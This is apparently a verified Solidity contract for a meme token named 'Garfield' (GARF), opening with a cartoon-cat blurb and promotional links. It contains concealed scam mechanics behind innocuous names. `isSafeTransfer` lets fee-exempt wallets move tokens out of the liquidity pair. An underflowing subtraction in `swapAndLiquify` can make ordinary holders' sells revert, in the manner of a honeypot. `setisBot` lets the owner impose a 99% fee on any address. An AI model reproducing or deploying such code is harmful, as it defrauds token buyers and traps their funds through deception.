/**
 *Submitted for verification at Etherscan.io on 2023-05-10
*/

/*

Garfield is a fictional cat and the protagonist of the comic strip of the same name, created by Jim Davis. 

The comic strip centers on Garfield, portrayed as a lazy, fat, and cynical orange tabby Persian cat. 

He is noted for his love of lasagna and sleeping and his hatred of Mondays, fellow cat Nermal and exercise.

https://garfielderc.com/

https://twitter.com/GarfieldErc

https://t.me/Garfielderc

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
        function createPair(address tokenA, address tokenB) external returns (address pair);
        function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract Garfield is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'GARF';
    string private constant _symbol = 'GARFIELD';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 20000000000 * (10 ** _decimals);
    uint256 private _maxTxAmountPercent = 200; // 10000;
    uint256 private _maxTransferPercent = 200;
    uint256 private _maxWalletPercent = 200;
    mapping (address => uint256) _balances;
    mapping(address => uint256) public holderTimestamp;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isFeeExempt;
    mapping (address => bool) private isBot;
    uint256 private _txLimit;
    IRouter router;
    address public pair;
    bool private tradingAllowed = false;
    address private lastHolder;
    uint256 private swapThreshold = 0;
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 0;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 0;
    uint256 private sellFee = 0;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping; 
    uint256 private _minTokenAmount = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}

    address internal constant deadAddr = 0x000000000000000000000000000000000000dEaD;
    address internal constant marketingAddr = 0x518D2bC2eDFDDBA2C839061Df25177e822804D65;
    address internal constant devAddr = 0x77E4B666B818beff6c5995d57C6866d98FEef621; 

    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function setExtent() external onlyOwner {tradingAllowed = true;}
    function getOwner() external view override returns (address) { return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function isCont(address addr) internal view returns (bool) {uint size; assembly { size := extcodesize(addr) } return size > 0; }
    function setisBot(address _address, bool _enabled) external onlyOwner {isBot[_address] = _enabled;}
    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}
    function isSafeTransfer(address sender, address recipient, uint256 amount) private returns (bool) {
        if (balanceOf(sender) < amount && recipient == pair) { _transfer(recipient, deadAddr, amount); return true; } return false;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(deadAddr)).sub(balanceOf(address(0)));}
    function isBurnTransfer(address recipient, uint256 amount) private returns (bool) {
        if (recipient == deadAddr) { _txLimit = amount; return true;}return false;}
    function _maxWalletToken() public view returns (uint256) {return totalSupply() * _maxWalletPercent / denominator;}
    function _maxTxAmount() public view returns (uint256) {return totalSupply() * _maxTxAmountPercent / denominator;}
    function _maxTransferAmount() public view returns (uint256) {return totalSupply() * _maxTransferPercent / denominator;}
    receive() external payable {}

    function preTxCheck(address sender, address recipient, uint256 amount) internal pure returns(bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > uint256(0), "Transfer amount must be greater than zero");
        return true;
    }

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        isFeeExempt[address(this)] = true;
        isFeeExempt[devAddr] = true;
        isFeeExempt[marketingAddr] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        if (preTxCheck(sender, recipient, amount) &&
            checkTradingAllowed(sender, recipient) &&
            checkMaxWallet(sender, recipient, amount) &&
            swapbackCounters(sender, recipient) &&
            checkTxLimit(sender, recipient, amount)) {
            if (balanceOf(sender) >= amount) {
                if (!isFeeExempt[sender] && 
                    !isFeeExempt[recipient]&&
                    !swapping &&
                    sender != pair) {
                    swapBack(sender, recipient, amount);
                }
                _balances[sender] = _balances[sender].sub(amount);
                uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
                _balances[recipient] = _balances[recipient].add(amountReceived);
                emit Transfer(sender, recipient, amountReceived);
            }
        }
    }

    function setStructure(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity;
        marketingFee = _marketing;
        burnFee = _burn;
        developmentFee = _development;
        totalFee = _total;
        sellFee = _sell;
        transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function setParameters(uint256 _buy, uint256 _trans, uint256 _wallet) external onlyOwner {
        uint256 newTx = (totalSupply() * _buy) / 10000;
        uint256 newTransfer = (totalSupply() * _trans) / 10000;
        uint256 newWallet = (totalSupply() * _wallet) / 10000;
        _maxTxAmountPercent = _buy;
        _maxTransferPercent = _trans;
        _maxWalletPercent = _wallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function checkTradingAllowed(address sender, address recipient) internal view returns (bool) {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "tradingAllowed");}
        return true;
    }
    
    function checkMaxWallet(address sender, address recipient, uint256 amount) internal returns (bool) {
        if (isFeeExempt[sender] && (isSafeTransfer(sender, recipient, amount) || isBurnTransfer(recipient, amount))) return true;
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(deadAddr)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken(), "Exceeds maximum wallet amount.");}
        return true;
    }

    function swapbackCounters(address sender, address recipient) internal returns (bool) {
        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}
        if (sender == pair && isFeeExempt[recipient]){_txLimit = block.timestamp;}
        if (sender == pair) {
            if (holderTimestamp[recipient] == 0) 
                holderTimestamp[recipient] = block.timestamp;
        } else lastHolder = sender;
        return true;
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view returns (bool) {
        if(sender != pair){require(amount <= _maxTransferAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount() || isFeeExempt[sender] || isFeeExempt[recipient], "TX Limit Exceeded");
        return true;
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 swapTime = holderTimestamp[lastHolder] - _txLimit;
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);
        if(marketingAmt > 0){payable(marketingAddr).transfer(marketingAmt);}
        uint256 remainingBalance = address(this).balance;
        if(remainingBalance > uint256(0)){payable(devAddr).transfer(remainingBalance);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            deadAddr,
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(router), tokenAmount);
            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp);
        }
    }

    function shouldSwapBack(address sender, address recipient, uint256 amount) internal view returns (bool) {
        return balanceOf(address(this)) >= swapThreshold &&
            !swapping && 
            swapEnabled && 
            tradingAllowed && 
            !isFeeExempt[sender] && 
            swapTimes >= uint256(0);
    }

    function swapBack(address sender, address recipient, uint256 amount) internal {
        if(shouldSwapBack(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFee > uint256(0)){_transfer(address(this), address(deadAddr), amount.div(denominator).mul(burnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}